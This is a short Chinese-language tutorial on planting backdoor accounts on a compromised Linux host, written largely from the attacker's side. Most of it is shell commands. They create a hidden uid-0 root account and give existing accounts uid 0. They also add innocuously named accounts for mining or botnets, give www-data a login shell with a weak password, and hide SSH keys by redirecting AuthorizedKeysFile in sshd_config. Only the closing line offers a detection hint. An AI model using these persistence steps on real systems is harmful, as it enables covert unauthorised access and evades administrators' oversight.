## 后门账户

常规加账户的基操差不多是这样的。

```shell
useradd -d /home/aplyc1a -c "aplyc1a" aplyc1a -s /bin/bash -m
passwd aplyc1a
```

攻击者拿下设备root权限后，可能会手工放置后门账户。留后门账户的手法相对而言比较固定，归根到底是动/etc/shadow、/etc/passwd文件，或加入免密公钥。使用过程中可以关注从名称及文件位置的角度增强后门账户的隐蔽性。

```shell
#shadow root后门账户
useradd -u 0 -o -g root -G root -M -s /bin/bash admin
# 也可以通过修改现有账户uid、gid实现
usermod -u 0 -o hips-user4



#普通权限的后门账户，但是名字有很强的迷惑性，可用于挖矿，botnet等。
useradd -d /x -c "config" -s /bin/bash config -m、
useradd -d /home/... -s /bin/bash x -m
#  也可以通过修改现有账户实现，如下通过让本身没有shell的账户变成可登录账户。
chsh -s /bin/sh www-data
echo "123456" | passwd –-stdin www-data
```



最常见的其实是攻击者在.ssh目录下放置自己的服务器公钥，实现免密登录持久化。这种方式本身隐蔽性是极强的，然而现在用多了大家都知道了之后，实际效果反而不是那么好。公钥一般加在：

```shell
~/.ssh/authorized_keys
```

我们也可以修改/etc/ssh/sshd_config中的AuthorizedKeysFile字段，隐藏我们真正的公钥。如下：

```shell
cat /etc/ssh/sshd_config|grep AuthorizedKeysFile
AuthorizedKeysFile    .cache

#others_user
ln /root/.ssh/authorized_keys ~/.cache/ssh.rc

#target_user
mkdir -p ~${target_user}/.cache
echo "xxxxxxxxxxxxxxxxxxxxxxxx" >> ~/.cache/ssh.rc

#这样，正常用户的免密公钥也能正常使用，我们只需要有针对性地维护目标用户即可。
```











对运维人员来说，可以重点关注如果账户被删掉了，但进程还在会ps等命令中会表现为一个编号。同时如果账号本身名称过长，在ps中会显示前7-8位后面替换成+号。

